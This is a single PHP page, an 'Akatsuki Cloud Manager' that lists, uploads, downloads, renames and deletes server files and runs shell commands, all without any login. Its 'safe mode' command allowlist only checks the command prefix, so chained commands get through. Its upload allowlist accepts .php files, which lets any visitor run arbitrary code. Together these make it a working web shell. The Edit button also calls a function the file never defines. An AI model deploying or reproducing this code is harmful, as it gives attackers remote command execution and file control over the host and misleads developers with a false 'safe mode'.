<?php
// Akatsuki Theme File Manager
// Enhanced with free folder navigation and system info

// Security settings
define('SAFE_MODE', true);
define('ALLOWED_COMMANDS', ['ls', 'pwd', 'whoami', 'date', 'df -h', 'ps aux', 'uname -a', 'free -h', 'uptime', 'du -h']);
define('MAX_EXECUTION_TIME', 5); // seconds
define('BASE_PATH', realpath('.'));
define('ALLOWED_EXTENSIONS', ['txt', 'php', 'js', 'css', 'html', 'jpg', 'png', 'gif', 'pdf', 'zip']);

// Akatsuki theme colors
$theme = [
    'bg' => '#0a0a0a',
    'card' => '#1a1a1a',
    'text' => '#ffffff',
    'accent' => '#c62828',
    'secondary' => '#37474f',
    'cloud' => '#2d3748',
    'success' => '#2e7d32',
    'warning' => '#f57c00'
];

// Initialize variables
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : BASE_PATH;
if (!$current_dir) $current_dir = BASE_PATH;
$current_dir = str_replace('\\', '/', $current_dir);
$message = '';
$output = '';
$folder_content = [];
$parent_dir = dirname($current_dir);

// Security: Prevent directory traversal
if (strpos($current_dir, BASE_PATH) !== 0) {
    $current_dir = BASE_PATH;
}

// Create new folder
if (isset($_POST['new_folder']) && !empty($_POST['folder_name'])) {
    $folder_name = preg_replace('/[^\w\s-]/', '', $_POST['folder_name']);
    $new_folder = $current_dir . '/' . $folder_name;
    if (!file_exists($new_folder)) {
        mkdir($new_folder, 0755);
        $message = "Folder '$folder_name' created successfully!";
    } else {
        $message = "Folder already exists!";
    }
}

// Rename file/folder
if (isset($_POST['rename'])) {
    $old_name = realpath($_POST['old_name']);
    $new_name = dirname($old_name) . '/' . preg_replace('/[^\w\s.-]/', '', $_POST['new_name']);
    
    if (strpos($old_name, BASE_PATH) === 0 && strpos($new_name, BASE_PATH) === 0) {
        if (rename($old_name, $new_name)) {
            $message = "Renamed successfully!";
        } else {
            $message = "Error renaming!";
        }
    }
}

// Handle file upload
if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] == 0) {
    $file_name = basename($_FILES['upload_file']['name']);
    $file_ext = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));
    
    if (in_array($file_ext, ALLOWED_EXTENSIONS)) {
        $target_file = $current_dir . '/' . $file_name;
        if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target_file)) {
            $message = "File uploaded successfully!";
        } else {
            $message = "Error uploading file.";
        }
    } else {
        $message = "File type not allowed!";
    }
}

// Handle file deletion
if (isset($_GET['delete']) && file_exists($_GET['delete'])) {
    $file_to_delete = realpath($_GET['delete']);
    if (strpos($file_to_delete, BASE_PATH) === 0) {
        if (is_dir($file_to_delete)) {
            if (is_dir_empty($file_to_delete)) {
                rmdir($file_to_delete);
                $message = "Folder deleted successfully!";
            } else {
                $message = "Folder is not empty!";
            }
        } else {
            unlink($file_to_delete);
            $message = "File deleted successfully!";
        }
    }
}

// Handle file download
if (isset($_GET['download']) && file_exists($_GET['download'])) {
    $file_to_download = realpath($_GET['download']);
    if (strpos($file_to_download, BASE_PATH) === 0 && !is_dir($file_to_download)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_to_download) . '"');
        header('Content-Length: ' . filesize($file_to_download));
        readfile($file_to_download);
        exit;
    }
}

// Handle command execution
if (isset($_POST['command']) && !empty($_POST['command'])) {
    $command = trim($_POST['command']);
    
    if (SAFE_MODE) {
        $allowed = false;
        foreach (ALLOWED_COMMANDS as $allowed_cmd) {
            if (strpos($command, $allowed_cmd) === 0) {
                $allowed = true;
                break;
            }
        }
        
        if ($allowed) {
            $descriptorspec = [
                0 => ["pipe", "r"],
                1 => ["pipe", "w"],
                2 => ["pipe", "w"]
            ];
            
            $process = proc_open($command, $descriptorspec, $pipes, $current_dir);
            
            if (is_resource($process)) {
                stream_set_blocking($pipes[1], false);
                stream_set_blocking($pipes[2], false);
                
                $timeout = MAX_EXECUTION_TIME;
                $start = time();
                $output = '';
                
                while (true) {
                    $read = [$pipes[1], $pipes[2]];
                    $write = null;
                    $except = null;
                    
                    $streams = stream_select($read, $write, $except, 0, 200000);
                    
                    if ($streams === false) {
                        break;
                    }
                    
                    foreach ($read as $stream) {
                        $output .= stream_get_contents($stream);
                    }
                    
                    if ((time() - $start) > $timeout) {
                        proc_terminate($process);
                        $output .= "\n[Command timed out after {$timeout} seconds]";
                        break;
                    }
                    
                    $status = proc_get_status($process);
                    if (!$status['running']) {
                        break;
                    }
                    
                    usleep(100000);
                }
                
                fclose($pipes[0]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($process);
            }
        } else {
            $output = "⚠️ Command not allowed in safe mode.\n\nAllowed commands:\n" . implode("\n", array_map(function($cmd) {
                return "  • " . $cmd;
            }, ALLOWED_COMMANDS));
        }
    }
}

// Get system information
function get_system_info() {
    $info = [];
    
    // Server info
    $info['Server Software'] = $_SERVER['SERVER_SOFTWARE'] ?? 'N/A';
    $info['PHP Version'] = phpversion();
    $info['Server Name'] = $_SERVER['SERVER_NAME'] ?? 'N/A';
    $info['Server Protocol'] = $_SERVER['SERVER_PROTOCOL'] ?? 'N/A';
    
    // System info
    if (function_exists('php_uname')) {
        $info['System'] = php_uname('s') . ' ' . php_uname('r');
        $info['Hostname'] = php_uname('n');
    }
    
    // Memory info
    $info['Memory Limit'] = ini_get('memory_limit');
    $info['Memory Usage'] = format_size(memory_get_usage(true));
    $info['Peak Memory'] = format_size(memory_get_peak_usage(true));
    
    // Disk space
    if (function_exists('disk_free_space')) {
        $info['Disk Free'] = format_size(disk_free_space("."));
        $info['Disk Total'] = format_size(disk_total_space("."));
    }
    
    // PHP info
    $info['Max Execution Time'] = ini_get('max_execution_time') . 's';
    $info['Upload Max Filesize'] = ini_get('upload_max_filesize');
    $info['Post Max Size'] = ini_get('post_max_size');
    
    // User info
    if (function_exists('get_current_user')) {
        $info['Current User'] = get_current_user();
    }
    
    // Safe mode status
    $info['Safe Mode'] = SAFE_MODE ? 'Enabled 🔒' : 'Disabled ⚠️';
    
    return $info;
}

// Get folder contents with details
$files = scandir($current_dir);
$files = array_diff($files, ['.', '..']);
foreach ($files as $file) {
    $file_path = $current_dir . '/' . $file;
    $folder_content[] = [
        'name' => $file,
        'path' => $file_path,
        'is_dir' => is_dir($file_path),
        'size' => is_dir($file_path) ? '-' : format_size(filesize($file_path)),
        'modified' => date('Y-m-d H:i:s', filemtime($file_path)),
        'permissions' => substr(sprintf('%o', fileperms($file_path)), -4),
        'owner' => function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($file_path))['name'] ?? 'N/A' : 'N/A'
    ];
}

// Helper functions
function format_size($bytes) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    return round($bytes, 2) . ' ' . $units[$pow];
}

function is_dir_empty($dir) {
    $files = scandir($dir);
    return count($files) <= 2; // Only . and ..
}

function get_folder_stats($dir) {
    $stats = ['files' => 0, 'folders' => 0, 'total_size' => 0];
    
    if (is_dir($dir)) {
        $files = scandir($dir);
        foreach ($files as $file) {
            if ($file != '.' && $file != '..') {
                $filepath = $dir . '/' . $file;
                if (is_dir($filepath)) {
                    $stats['folders']++;
                } else {
                    $stats['files']++;
                    $stats['total_size'] += filesize($filepath);
                }
            }
        }
    }
    
    return $stats;
}

$folder_stats = get_folder_stats($current_dir);
$system_info = get_system_info();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>☁️ Akatsuki Cloud File Manager</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: <?= $theme['bg'] ?>;
            color: <?= $theme['text'] ?>;
            line-height: 1.6;
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(198, 40, 40, 0.1) 0%, transparent 20%),
                radial-gradient(circle at 90% 80%, rgba(198, 40, 40, 0.1) 0%, transparent 20%),
                repeating-linear-gradient(45deg, transparent, transparent 10px, rgba(55, 71, 79, 0.05) 10px, rgba(55, 71, 79, 0.05) 20px);
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            text-align: center;
            padding: 30px 0;
            border-bottom: 2px solid <?= $theme['accent'] ?>;
            margin-bottom: 30px;
            position: relative;
            background: linear-gradient(135deg, rgba(198, 40, 40, 0.1) 0%, rgba(26, 26, 26, 0.8) 100%);
            border-radius: 10px;
            backdrop-filter: blur(10px);
        }
        
        .header h1 {
            font-size: 2.8em;
            color: <?= $theme['accent'] ?>;
            text-shadow: 0 0 20px rgba(198, 40, 40, 0.7);
            margin-bottom: 10px;
            letter-spacing: 2px;
        }
        
        .header h1::before {
            content: '☁️';
            margin-right: 15px;
            animation: float 3s ease-in-out infinite;
        }
        
        @keyframes float {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-5px); }
        }
        
        .header p {
            color: <?= $theme['text'] ?>;
            opacity: 0.9;
            font-size: 1.1em;
        }
        
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
            gap: 25px;
            margin-bottom: 30px;
        }
        
        .card {
            background: <?= $theme['card'] ?>;
            border-radius: 12px;
            padding: 25px;
            border: 1px solid <?= $theme['secondary'] ?>;
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.4);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }
        
        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 8px 16px rgba(198, 40, 40, 0.2);
        }
        
        .card-title {
            color: <?= $theme['accent'] ?>;
            margin-bottom: 20px;
            font-size: 1.3em;
            border-bottom: 2px solid <?= $theme['secondary'] ?>;
            padding-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .card-title i {
            font-size: 1.2em;
        }
        
        .nav-path {
            background: <?= $theme['cloud'] ?>;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-family: 'Courier New', monospace;
            word-break: break-all;
            border: 1px solid <?= $theme['secondary'] ?>;
        }
        
        .path-input {
            background: <?= $theme['bg'] ?>;
            border: 1px solid <?= $theme['accent'] ?>;
            color: <?= $theme['text'] ?>;
            padding: 12px;
            border-radius: 6px;
            width: 100%;
            margin-bottom: 15px;
            font-family: monospace;
        }
        
        .folder-stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin-bottom: 25px;
        }
        
        .stat-box {
            background: <?= $theme['cloud'] ?>;
            padding: 15px;
            border-radius: 8px;
            text-align: center;
            border: 1px solid <?= $theme['secondary'] ?>;
        }
        
        .stat-value {
            font-size: 1.8em;
            font-weight: bold;
            color: <?= $theme['accent'] ?>;
            margin-bottom: 5px;
        }
        
        .stat-label {
            font-size: 0.9em;
            color: #aaa;
        }
        
        .file-list {
            max-height: 500px;
            overflow-y: auto;
            margin-bottom: 20px;
        }
        
        .file-item {
            background: <?= $theme['cloud'] ?>;
            padding: 15px;
            border-radius: 8px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            transition: all 0.3s ease;
            margin-bottom: 8px;
            border: 1px solid transparent;
        }
        
        .file-item:hover {
            background: <?= $theme['secondary'] ?>;
            border-color: <?= $theme['accent'] ?>;
            transform: translateX(5px);
        }
        
        .file-info {
            flex-grow: 1;
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .file-icon {
            font-size: 1.5em;
            width: 30px;
            text-align: center;
        }
        
        .folder-icon {
            color: #4fc3f7;
        }
        
        .file-icon-default {
            color: #81c784;
        }
        
        .file-name {
            flex-grow: 1;
            font-family: 'Courier New', monospace;
            word-break: break-all;
        }
        
        .file-details {
            display: flex;
            gap: 20px;
            align-items: center;
            color: #aaa;
            font-size: 0.9em;
        }
        
        .file-actions {
            display: flex;
            gap: 8px;
            flex-shrink: 0;
        }
        
        .btn {
            padding: 8px 16px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 5px;
            font-size: 0.9em;
        }
        
        .btn-sm {
            padding: 5px 10px;
            font-size: 0.8em;
        }
        
        .btn-primary {
            background: linear-gradient(135deg, <?= $theme['accent'] ?>, #e53935);
            color: white;
        }
        
        .btn-primary:hover {
            background: linear-gradient(135deg, #e53935, <?= $theme['accent'] ?>);
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(198, 40, 40, 0.3);
        }
        
        .btn-secondary {
            background: <?= $theme['secondary'] ?>;
            color: white;
        }
        
        .btn-secondary:hover {
            background: #455a64;
            transform: translateY(-2px);
        }
        
        .btn-success {
            background: <?= $theme['success'] ?>;
            color: white;
        }
        
        .btn-success:hover {
            background: #1b5e20;
            transform: translateY(-2px);
        }
        
        .btn-warning {
            background: <?= $theme['warning'] ?>;
            color: white;
        }
        
        .btn-warning:hover {
            background: #e65100;
            transform: translateY(-2px);
        }
        
        .btn-danger {
            background: linear-gradient(135deg, #d32f2f, #b71c1c);
            color: white;
        }
        
        .btn-danger:hover {
            background: linear-gradient(135deg, #b71c1c, #d32f2f);
            transform: translateY(-2px);
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-control {
            width: 100%;
            padding: 12px;
            background: <?= $theme['cloud'] ?>;
            border: 1px solid <?= $theme['secondary'] ?>;
            border-radius: 6px;
            color: <?= $theme['text'] ?>;
            font-family: monospace;
            transition: border-color 0.3s ease;
        }
        
        .form-control:focus {
            outline: none;
            border-color: <?= $theme['accent'] ?>;
            box-shadow: 0 0 0 2px rgba(198, 40, 40, 0.2);
        }
        
        .message {
            padding: 15px;
            background: rgba(198, 40, 40, 0.1);
            border: 1px solid <?= $theme['accent'] ?>;
            border-radius: 8px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .output-box {
            background: <?= $theme['cloud'] ?>;
            padding: 20px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
            max-height: 400px;
            overflow-y: auto;
            margin-top: 20px;
            border: 1px solid <?= $theme['secondary'] ?>;
        }
        
        .status-bar {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: <?= $theme['card'] ?>;
            padding: 12px;
            text-align: center;
            border-top: 2px solid <?= $theme['accent'] ?>;
            font-size: 0.9em;
            display: flex;
            justify-content: space-around;
            align-items: center;
            z-index: 1000;
        }
        
        .system-info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 15px;
            margin-top: 20px;
        }
        
        .info-item {
            background: <?= $theme['cloud'] ?>;
            padding: 15px;
            border-radius: 6px;
            border-left: 4px solid <?= $theme['accent'] ?>;
        }
        
        .info-label {
            color: #aaa;
            font-size: 0.9em;
            margin-bottom: 5px;
        }
        
        .info-value {
            color: <?= $theme['text'] ?>;
            font-family: 'Courier New', monospace;
            word-break: break-all;
        }
        
        .quick-actions {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-bottom: 20px;
        }
        
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(5px);
        }
        
        .modal-content {
            background: <?= $theme['card'] ?>;
            margin: 10% auto;
            padding: 30px;
            border-radius: 12px;
            width: 80%;
            max-width: 500px;
            border: 2px solid <?= $theme['accent'] ?>;
            position: relative;
        }
        
        .close {
            position: absolute;
            right: 20px;
            top: 20px;
            color: <?= $theme['accent'] ?>;
            font-size: 28px;
            cursor: pointer;
        }
        
        .scroll-to-top {
            position: fixed;
            bottom: 70px;
            right: 20px;
            background: <?= $theme['accent'] ?>;
            color: white;
            width: 50px;
            height: 50px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            font-size: 24px;
            z-index: 999;
            box-shadow: 0 4px 12px rgba(198, 40, 40, 0.4);
            transition: all 0.3s ease;
        }
        
        .scroll-to-top:hover {
            transform: translateY(-5px);
            box-shadow: 0 6px 16px rgba(198, 40, 40, 0.6);
        }
        
        .breadcrumb {
            margin-bottom: 15px;
            display: flex;
            flex-wrap: wrap;
            gap: 5px;
            align-items: center;
        }
        
        .breadcrumb a {
            color: <?= $theme['accent'] ?>;
            text-decoration: none;
            padding: 5px 10px;
            border-radius: 4px;
            transition: background 0.3s ease;
        }
        
        .breadcrumb a:hover {
            background: rgba(198, 40, 40, 0.1);
        }
        
        .breadcrumb .separator {
            color: <?= $theme['secondary'] ?>;
        }
        
        ::-webkit-scrollbar {
            width: 10px;
            height: 10px;
        }
        
        ::-webkit-scrollbar-track {
            background: <?= $theme['cloud'] ?>;
            border-radius: 5px;
        }
        
        ::-webkit-scrollbar-thumb {
            background: <?= $theme['accent'] ?>;
            border-radius: 5px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: #e53935;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1><i class="fas fa-cloud"></i> Akatsuki Cloud Manager</h1>
            <p>Shinobi File System - Complete Control Over Your Cloud Network</p>
        </div>
        
        <?php if ($message): ?>
            <div class="message">
                <i class="fas fa-info-circle"></i>
                <?= htmlspecialchars($message) ?>
            </div>
        <?php endif; ?>
        
        <div class="grid">
            <!-- Navigation Card -->
            <div class="card">
                <div class="card-title">
                    <i class="fas fa-folder-tree"></i> Navigation
                </div>
                
                <form method="GET" action="" class="form-group">
                    <input type="text" 
                           name="dir" 
                           class="path-input" 
                           value="<?= htmlspecialchars($current_dir) ?>"
                           placeholder="Enter full path to navigate...">
                    <div class="quick-actions">
                        <button type="submit" class="btn btn-primary">
                            <i class="fas fa-search"></i> Go
                        </button>
                        <a href="?dir=<?= urlencode($parent_dir) ?>" class="btn btn-secondary">
                            <i class="fas fa-level-up-alt"></i> Parent
                        </a>
                        <a href="?dir=<?= urlencode(BASE_PATH) ?>" class="btn btn-secondary">
                            <i class="fas fa-home"></i> Root
                        </a>
                    </div>
                </form>
                
                <div class="breadcrumb">
                    <?php
                    $path_parts = explode('/', str_replace(BASE_PATH, '', $current_dir));
                    $current_path = BASE_PATH;
                    echo '<a href="?dir=' . urlencode(BASE_PATH) . '"><i class="fas fa-home"></i> Root</a>';
                    foreach ($path_parts as $part) {
                        if (!empty($part)) {
                            $current_path .= '/' . $part;
                            echo '<span class="separator">/</span>';
                            echo '<a href="?dir=' . urlencode($current_path) . '">' . htmlspecialchars($part) . '</a>';
                        }
                    }
                    ?>
                </div>
                
                <div class="folder-stats">
                    <div class="stat-box">
                        <div class="stat-value"><?= $folder_stats['files'] ?></div>
                        <div class="stat-label">Files</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-value"><?= $folder_stats['folders'] ?></div>
                        <div class="stat-label">Folders</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-value"><?= format_size($folder_stats['total_size']) ?></div>
                        <div class="stat-label">Total Size</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-value"><?= count($folder_content) ?></div>
                        <div class="stat-label">Items</div>
                    </div>
                </div>
            </div>
            
            <!-- System Info Card -->
            <div class="card">
                <div class="card-title">
                    <i class="fas fa-server"></i> System Information
                </div>
                
                <div class="system-info-grid">
                    <?php foreach ($system_info as $label => $value): ?>
                        <div class="info-item">
                            <div class="info-label"><?= htmlspecialchars($label) ?></div>
                            <div class="info-value"><?= htmlspecialchars($value) ?></div>
                        </div>
                    <?php endforeach; ?>
                </div>
                
                <div style="margin-top: 20px;">
                    <button onclick="showQuickCommands()" class="btn btn-primary">
                        <i class="fas fa-terminal"></i> Quick Commands
                    </button>
                    <button onclick="refreshSystemInfo()" class="btn btn-secondary">
                        <i class="fas fa-sync-alt"></i> Refresh
                    </button>
                </div>
            </div>
        </div>
        
        <!-- File Manager Card -->
        <div class="card">
            <div class="card-title">
                <i class="fas fa-file-alt"></i> File Manager
            </div>
            
            <div class="quick-actions">
                <button onclick="showUploadModal()" class="btn btn-success">
                    <i class="fas fa-upload"></i> Upload
                </button>
                <button onclick="showNewFolderModal()" class="btn btn-primary">
                    <i class="fas fa-folder-plus"></i> New Folder
                </button>
                <form method="GET" action="" style="display: inline;">
                    <input type="hidden" name="dir" value="<?= htmlspecialchars($current_dir) ?>">
                    <button type="submit" class="btn btn-secondary">
                        <i class="fas fa-redo"></i> Refresh
                    </button>
                </form>
            </div>
            
            <div class="file-list">
                <?php foreach ($folder_content as $item): ?>
                    <div class="file-item">
                        <div class="file-info">
                            <div class="file-icon <?= $item['is_dir'] ? 'folder-icon' : 'file-icon-default' ?>">
                                <?= $item['is_dir'] ? '📁' : '📄' ?>
                            </div>
                            <div class="file-name">
                                <?php if ($item['is_dir']): ?>
                                    <a href="?dir=<?= urlencode($item['path']) ?>" style="color: inherit; text-decoration: none;">
                                        <strong><?= htmlspecialchars($item['name']) ?></strong>
                                    </a>
                                <?php else: ?>
                                    <?= htmlspecialchars($item['name']) ?>
                                <?php endif; ?>
                            </div>
                        </div>
                        <div class="file-details">
                            <span><?= $item['size'] ?></span>
                            <span><?= $item['permissions'] ?></span>
                            <span><?= $item['modified'] ?></span>
                        </div>
                        <div class="file-actions">
                            <?php if (!$item['is_dir']): ?>
                                <a href="?download=<?= urlencode($item['path']) ?>" 
                                   class="btn btn-sm btn-success" 
                                   title="Download">
                                    <i class="fas fa-download"></i>
                                </a>
                                <a href="javascript:void(0)" 
                                   onclick="editFile('<?= htmlspecialchars($item['name']) ?>', '<?= htmlspecialchars($item['path']) ?>')"
                                   class="btn btn-sm btn-warning"
                                   title="Edit">
                                    <i class="fas fa-edit"></i>
                                </a>
                            <?php endif; ?>
                            <button onclick="renameItem('<?= htmlspecialchars($item['name']) ?>', '<?= htmlspecialchars($item['path']) ?>')" 
                                    class="btn btn-sm btn-secondary"
                                    title="Rename">
                                <i class="fas fa-i-cursor"></i>
                            </button>
                            <a href="?delete=<?= urlencode($item['path']) ?>" 
                               class="btn btn-sm btn-danger"
                               onclick="return confirm('Delete <?= htmlspecialchars($item['name']) ?>?')"
                               title="Delete">
                                <i class="fas fa-trash"></i>
                            </a>
                        </div>
                    </div>
                <?php endforeach; ?>
            </div>
        </div>
        
        <!-- Command Execution Card -->
        <div class="card">
            <div class="card-title">
                <i class="fas fa-terminal"></i> Command Execution
                <span style="font-size: 0.8em; color: <?= SAFE_MODE ? $theme['success'] : $theme['warning'] ?>; margin-left: auto;">
                    Safe Mode: <?= SAFE_MODE ? 'ON 🔒' : 'OFF ⚠️' ?>
                </span>
            </div>
            
            <p style="margin-bottom: 20px; color: #aaa; font-size: 0.9em;">
                <i class="fas fa-shield-alt"></i> Allowed commands in safe mode:
                <?= implode(', ', array_map(function($cmd) { return '<code>' . htmlspecialchars($cmd) . '</code>'; }, ALLOWED_COMMANDS)) ?>
            </p>
            
            <form method="POST" action="">
                <div class="form-group">
                    <div style="display: flex; gap: 10px;">
                        <input type="text" 
                               name="command" 
                               class="form-control" 
                               placeholder="Enter command (e.g., ls -la, df -h, free -m)"
                               id="commandInput"
                               style="flex-grow: 1;">
                        <button type="submit" class="btn btn-primary">
                            <i class="fas fa-play"></i> Execute
                        </button>
                    </div>
                </div>
                
                <div class="quick-actions">
                    <button type="button" onclick="setCommand('ls -la')" class="btn btn-sm btn-secondary">
                        ls -la
                    </button>
                    <button type="button" onclick="setCommand('df -h')" class="btn btn-sm btn-secondary">
                        df -h
                    </button>
                    <button type="button" onclick="setCommand('free -m')" class="btn btn-sm btn-secondary">
                        free -m
                    </button>
                    <button type="button" onclick="setCommand('ps aux | head -20')" class="btn btn-sm btn-secondary">
                        ps aux
                    </button>
                    <button type="button" onclick="setCommand('du -h --max-depth=1')" class="btn btn-sm btn-secondary">
                        du -h
                    </button>
                </div>
            </form>
            
            <?php if (!empty($output)): ?>
                <div class="output-box">
                    <div style="color: <?= $theme['accent'] ?>; margin-bottom: 10px; font-weight: bold;">
                        <i class="fas fa-code"></i> Command Output:
                    </div>
                    <?= nl2br(htmlspecialchars($output)) ?>
                </div>
            <?php endif; ?>
        </div>
    </div>
    
    <!-- Modals -->
    <div id="uploadModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="hideUploadModal()">&times;</span>
            <h3 style="margin-bottom: 20px; color: <?= $theme['accent'] ?>;">
                <i class="fas fa-upload"></i> Upload File
            </h3>
            <form method="POST" action="" enctype="multipart/form-data">
                <div class="form-group">
                    <input type="file" name="upload_file" class="form-control" required>
                </div>
                <div class="form-group">
                    <small style="color: #aaa;">Allowed extensions: <?= implode(', ', ALLOWED_EXTENSIONS) ?></small>
                </div>
                <button type="submit" class="btn btn-primary">
                    <i class="fas fa-cloud-upload-alt"></i> Upload
                </button>
            </form>
        </div>
    </div>
    
    <div id="newFolderModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="hideNewFolderModal()">&times;</span>
            <h3 style="margin-bottom: 20px; color: <?= $theme['accent'] ?>;">
                <i class="fas fa-folder-plus"></i> Create New Folder
            </h3>
            <form method="POST" action="">
                <div class="form-group">
                    <input type="text" 
                           name="folder_name" 
                           class="form-control" 
                           placeholder="Enter folder name"
                           required>
                </div>
                <button type="submit" class="btn btn-primary">
                    <i class="fas fa-plus"></i> Create
                </button>
            </form>
        </div>
    </div>
    
    <div id="renameModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="hideRenameModal()">&times;</span>
            <h3 style="margin-bottom: 20px; color: <?= $theme['accent'] ?>;">
                <i class="fas fa-i-cursor"></i> Rename
            </h3>
            <form method="POST" action="" id="renameForm">
                <input type="hidden" name="old_name" id="oldName">
                <div class="form-group">
                    <input type="text" 
                           name="new_name" 
                           id="newName"
                           class="form-control" 
                           placeholder="Enter new name"
                           required>
                </div>
                <button type="submit" class="btn btn-primary">
                    <i class="fas fa-check"></i> Rename
                </button>
            </form>
        </div>
    </div>
    
    <div id="quickCommandsModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="hideQuickCommandsModal()">&times;</span>
            <h3 style="margin-bottom: 20px; color: <?= $theme['accent'] ?>;">
                <i class="fas fa-terminal"></i> Quick Commands
            </h3>
            <div style="display: grid; gap: 10px;">
                <?php foreach (ALLOWED_COMMANDS as $cmd): ?>
                    <button onclick="setCommand('<?= $cmd ?>')" class="btn btn-secondary" style="text-align: left;">
                        <code><?= $cmd ?></code>
                    </button>
                <?php endforeach; ?>
            </div>
        </div>
    </div>
    
    <!-- Scroll to top button -->
    <div class="scroll-to-top" onclick="scrollToTop()">
        <i class="fas fa-chevron-up"></i>
    </div>
    
    <!-- Status Bar -->
    <div class="status-bar">
        <div>
            <i class="fas fa-cloud" style="color: <?= $theme['accent'] ?>;"></i>
            <span>Akatsuki Cloud</span>
        </div>
        <div>
            <i class="fas fa-folder-open"></i>
            <span><?= htmlspecialchars($current_dir) ?></span>
        </div>
        <div>
            <i class="fas fa-memory"></i>
            <span><?= format_size(memory_get_usage()) ?></span>
        </div>
        <div>
            <i class="fas fa-user-shield"></i>
            <span>User: <?= get_current_user() ?: 'Unknown' ?></span>
        </div>
        <div>
            <i class="fas fa-clock"></i>
            <span><?= date('Y-m-d H:i:s') ?></span>
        </div>
    </div>
    
    <script>
        // Modal functions
        function showUploadModal() {
            document.getElementById('uploadModal').style.display = 'block';
        }
        
        function hideUploadModal() {
            document.getElementById('uploadModal').style.display = 'none';
        }
        
        function showNewFolderModal() {
            document.getElementById('newFolderModal').style.display = 'block';
        }
        
        function hideNewFolderModal() {
            document.getElementById('newFolderModal').style.display = 'none';
        }
        
        function renameItem(oldName, oldPath) {
            document.getElementById('oldName').value = oldPath;
            document.getElementById('newName').value = oldName;
            document.getElementById('renameModal').style.display = 'block';
            document.getElementById('newName').focus();
            document.getElementById('newName').select();
        }
        
        function hideRenameModal() {
            document.getElementById('renameModal').style.display = 'none';
        }
        
        function showQuickCommands() {
            document.getElementById('quickCommandsModal').style.display = 'block';
        }
        
        function hideQuickCommandsModal() {
            document.getElementById('quickCommandsModal').style.display = 'none';
        }
        
        // Command functions
        function setCommand(cmd) {
            document.getElementById('commandInput').value = cmd;
            hideQuickCommandsModal();
        }
        
        function refreshSystemInfo() {
            location.reload();
        }
        
        // Scroll functions
        function scrollToTop() {
            window.scrollTo({top: 0, behavior: 'smooth'});
        }
        
        // Close modals when clicking outside
        window.onclick = function(event) {
            var modals = document.querySelectorAll('.modal');
            modals.forEach(function(modal) {
                if (event.target == modal) {
                    modal.style.display = 'none';
                }
            });
        }
        
        // Close modals with ESC key
        document.onkeydown = function(evt) {
            evt = evt || window.event;
            if (evt.keyCode == 27) {
                var modals = document.querySelectorAll('.modal');
                modals.forEach(function(modal) {
                    modal.style.display = 'none';
                });
            }
        };
        
        // Focus command input on page load
        window.onload = function() {
            <?php if (isset($_POST['command'])): ?>
                document.getElementById('commandInput').focus();
            <?php endif; ?>
        };
    </script>
</body>
</html>
